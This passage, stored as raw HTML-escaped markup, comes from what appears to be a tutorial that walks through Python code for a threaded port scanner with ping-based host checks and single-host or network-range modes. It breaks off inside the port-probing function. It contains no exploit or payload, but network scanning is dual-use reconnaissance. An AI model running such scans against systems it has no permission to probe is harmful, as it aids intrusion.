&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		start_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter start port : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		end_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter end port : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;input_check&lt;&#x2F;span&gt;&lt;span&gt;(start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;single_host_scan&lt;&#x2F;span&gt;&lt;span&gt;(start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port)
&lt;&#x2F;span&gt;&lt;span&gt;		sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Scanning Entire Network..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		target_ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter your IP address : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		start_host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter start host : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		end_host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter end host : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		start_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter start port : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		end_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter end port : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;input_check&lt;&#x2F;span&gt;&lt;span&gt;(start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;host_check&lt;&#x2F;span&gt;&lt;span&gt;(start_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_host)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;multi_host_scan&lt;&#x2F;span&gt;&lt;span&gt;(start_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port)
&lt;&#x2F;span&gt;&lt;span&gt;		sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Invalid choice.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the beginning, this tool will asks the users for their choice to perform a specific task.
i.e, to scan a single target or an entire network. If the user choose 1, then the tool will take start port and end port as an input from the user. Then the program is going to validate the inputs given, this is done by the &lt;code&gt;input_check&lt;&#x2F;code&gt; function. Next the &lt;code&gt;single_host_scan&lt;&#x2F;code&gt; will be called. Take look at these two functions.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;input_check()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;input_check&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end_port&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;target_ip
&lt;&#x2F;span&gt;&lt;span&gt;	ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;{1,3}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;{1,3}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;{1,3}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;{1,3}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;)&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;target_ip)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span&gt;ip:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;			target_ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gethostbyname&lt;&#x2F;span&gt;&lt;span&gt;(target_ip)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;socket.gaierror :
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Unable resolve host address&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((start_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;(end_port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65535&lt;&#x2F;span&gt;&lt;span&gt;)):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Port numbers are invalid.. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the try block of the input_check function, if a user gave a website as target that url will be changed to IP address here.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;single_host_scan()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;single_host_scan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end_port&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;islive&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;port &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(start_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;end_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;			thread &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;threading&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;single_port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;args &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(port&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;			thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;			thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; Not reachable.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the above function the islive function will checks that the given host is live or not. If it is live then it is going to scan every port in a given range of that target host.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;islive()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;islive&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Linux&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;			p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;subprocess&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ping&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;-c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;target_ip]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;capture_output&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;returncode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Windows&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;			p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;subprocess&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ping&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;-n&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;target_ip]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;capture_output&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;returncode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;subprocess.CalledProcessError:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;islive() function uses a ping scan to check the target is live or not.&lt;&#x2F;p&gt;
&lt;p&gt;If the target is live, a thread is created for each port to increase the speed of the scan. In every thread single_port() function is being called.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;single_port&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;single_port&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;port&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;AF_INET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;SOCK_STREAM)
